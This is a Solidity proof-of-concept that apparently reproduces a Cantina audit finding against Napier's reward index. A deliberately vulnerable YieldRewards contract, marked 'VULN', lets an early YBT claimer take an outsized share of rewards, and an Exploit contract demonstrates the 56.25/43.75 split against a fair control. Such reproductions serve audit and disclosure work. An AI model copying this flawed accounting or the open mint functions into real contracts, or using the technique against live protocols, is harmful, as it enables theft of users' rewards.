// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Napier — Cantina, finding 53034 (Feb 2025)
    updateIndex accrues external rewards with totalAccrued / ytSupply.
    Claiming YBT yield pulls YBT out of the PT, so that YBT earns its own
    rewards for the claimer, while the YT index still pays them a full share
    of whatever the PT has left. Alice and Bob each hold 50 YT.
    Alice claims at exchange rate 2 and finishes with 56.25 reward.
    Bob finishes with 43.75. The control never claims early: each receives 50.
*/

library FixedPointMathLib {
    function divWad(uint256 x, uint256 y) internal pure returns (uint256) {
        return x * 1e18 / y;
    }

    function mulWad(uint256 x, uint256 y) internal pure returns (uint256) {
        return x * y / 1e18;
    }
}

contract RewardToken {
    string public symbol = "RWD";
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract YbtToken {
    string public symbol = "YBT";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract YieldRewards {
    struct UserReward {
        uint256 accrued;
        uint256 userIndex;
    }

    RewardToken public reward;
    YbtToken public ybt;
    uint256 public index;
    uint256 public ytSupply;
    uint256 public ptYbt;
    mapping(address => uint256) public ytBalance;
    mapping(address => UserReward) public users;
    mapping(address => uint256) public ybtBalance;
    mapping(address => uint256) public paid;

    constructor(RewardToken _reward, YbtToken _ybt) {
        reward = _reward;
        ybt = _ybt;
    }

    function setPosition(address account, uint256 ytAmount) external {
        ytBalance[account] = ytAmount;
        ytSupply += ytAmount;
    }

    function setPtYbt(uint256 amount) external {
        ptYbt = amount;
    }

    function updateIndex(uint256 index_, uint256 ytSupply_, uint256 totalAccrued)
        internal
        pure
        returns (uint256 newIndex, uint256 lostReward)
    {
        if (ytSupply_ == 0) return (index_, totalAccrued);
        // @> VULN: the index is totalAccrued / ytSupply, so YBT already claimed out of the PT still earns a private reward
        newIndex = index_ + FixedPointMathLib.divWad(totalAccrued, ytSupply_);
        lostReward = totalAccrued - FixedPointMathLib.mulWad(ytSupply_, newIndex - index_);
    }

    function accrueUserReward(address account, uint256 index_, uint256 ytBal) internal {
        UserReward memory prev = users[account];
        uint256 accrued = FixedPointMathLib.mulWad(ytBal, index_ - prev.userIndex);
        users[account].accrued = prev.accrued + accrued;
        users[account].userIndex = index_;
    }

    function distribute(uint256 totalAccrued) external {
        (uint256 newIndex,) = updateIndex(index, ytSupply, totalAccrued);
        index = newIndex;
        reward.mint(address(this), totalAccrued);
    }

    function accrue(address account) external {
        accrueUserReward(account, index, ytBalance[account]);
    }

    function claimYbt(address account, uint256 amount) external {
        require(ptYbt >= amount, "ybt");
        ptYbt -= amount;
        ybtBalance[account] += amount;
        require(ybt.transfer(account, amount), "ybt out");
    }

    function payPrivateYbtReward(address account, uint256 amount) external {
        reward.mint(address(this), amount);
        users[account].accrued += amount;
    }

    function payout(address account) external returns (uint256 amount) {
        amount = users[account].accrued;
        users[account].accrued = 0;
        paid[account] += amount;
        if (amount > 0) require(reward.transfer(account, amount), "pay");
    }
}

contract Exploit {
    uint256 public constant YT = 50 ether;
    uint256 public constant FIRST_REWARD = 50 ether;
    uint256 public constant SECOND_PT_REWARD = 37.5 ether;
    uint256 public constant PRIVATE_REWARD = 12.5 ether;

    RewardToken public reward;
    YbtToken public ybt;
    YieldRewards public book;
    address public bob;
    uint256 public alicePaid;
    uint256 public bobPaid;

    constructor() {
        reward = new RewardToken();
        ybt = new YbtToken();
        book = new YieldRewards(reward, ybt);
        bob = address(new Bob());
        book.setPosition(address(this), YT);
        book.setPosition(bob, YT);
        ybt.mint(address(book), 100 ether);
        book.setPtYbt(100 ether);
    }

    function run() external {
        book.distribute(FIRST_REWARD);
        book.accrue(address(this));
        book.accrue(bob);
        (uint256 aliceAfterFirst,) = book.users(address(this));
        book.claimYbt(address(this), 25 ether);
        uint256 ptLeft = book.ptYbt();
        book.distribute(SECOND_PT_REWARD);
        book.accrue(address(this));
        book.accrue(bob);
        book.payPrivateYbtReward(address(this), PRIVATE_REWARD);
        alicePaid = book.payout(address(this));
        bobPaid = book.payout(bob);
        require(aliceAfterFirst == 25 ether, "first");
        require(ptLeft == 75 ether, "pt");
        require(ybt.balanceOf(address(this)) == 25 ether, "claimed ybt");
        require(alicePaid == 56.25 ether, "alice");
        require(bobPaid == 43.75 ether, "bob");
        require(reward.balanceOf(address(this)) == 56.25 ether, "alice bal");
        require(reward.balanceOf(bob) == 43.75 ether, "bob bal");
    }

    function runFair() external returns (uint256 alice, uint256 bobPaid_) {
        book.distribute(50 ether);
        book.accrue(address(this));
        book.accrue(bob);
        book.distribute(50 ether);
        book.accrue(address(this));
        book.accrue(bob);
        alice = book.payout(address(this));
        bobPaid_ = book.payout(bob);
    }
}

contract Bob {}
